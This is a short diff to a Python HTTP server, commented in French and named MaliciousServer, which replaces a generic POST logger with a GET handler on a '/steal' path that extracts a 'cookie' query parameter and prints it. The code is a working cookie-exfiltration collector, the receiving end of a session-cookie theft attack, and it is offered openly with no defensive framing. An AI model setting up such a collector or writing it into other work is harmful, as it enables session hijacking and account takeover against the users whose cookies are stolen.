@@ -1,15 +1,24 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
+import urllib.parse
 
 class MaliciousServer(BaseHTTPRequestHandler):
-    def do_POST(self):
-        content_length = int(self.headers['Content-Length'])  # Taille des données
-        post_data = self.rfile.read(content_length)  # Lire les données envoyées
-        print(f"Received data: {post_data.decode('utf-8')}")  # Afficher les données dans la console
-        
-        # Réponse au client
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b"Data received!")
+    def do_GET(self):
+        # Vérification du chemin
+        if self.path.startswith('/steal'):
+            # Extraire le paramètre "cookie" depuis l'URL
+            query = urllib.parse.urlparse(self.path).query
+            params = urllib.parse.parse_qs(query)
+
+            # Récupérer la valeur du cookie
+            cookie = params.get('cookie', [''])[0]  # Par défaut, retourne une chaîne vide si absent
+
+            # Afficher les cookies
+            print(f"Received cookie: {cookie}")
+
+            # Réponse au client
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"Cookie received!")
 
 # Configuration du serveur
 host = "127.0.0.1"
